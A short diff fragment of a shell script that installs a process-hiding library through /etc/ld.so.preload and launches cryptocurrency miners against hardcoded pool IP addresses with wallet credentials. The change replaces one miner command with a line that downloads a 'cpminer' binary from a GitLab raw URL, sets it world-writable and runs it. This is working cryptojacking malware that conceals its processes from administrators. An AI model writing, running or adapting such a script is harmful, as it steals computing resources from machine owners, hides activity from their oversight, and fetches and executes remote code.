@@ -57,5 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
-chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar  -o stratum+tcp://138.197.12.20:443 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4
